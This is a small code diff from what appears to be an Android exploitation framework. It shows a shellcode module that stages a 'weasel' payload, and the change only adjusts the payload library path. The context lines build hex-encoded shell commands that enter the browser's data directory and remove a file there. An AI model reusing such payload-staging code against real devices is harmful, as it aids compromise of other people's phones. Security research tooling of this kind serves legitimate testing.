@@ -53,7 +53,7 @@ class ARMEABI(Module, common.ShellCode):
             directory = self.__exploit.working_directory
         else:
             directory = "/data/data/com.android.browser"
-        weasel = Configuration.library(os.path.join("weasel", architecture))
+        weasel = Configuration.library(os.path.join("weasel", architecture, "w"))
         
         self.append(self.hexifyString("cd %s\n" % directory))
         self.append(self.hexifyString("/system/bin/rm w\n"))
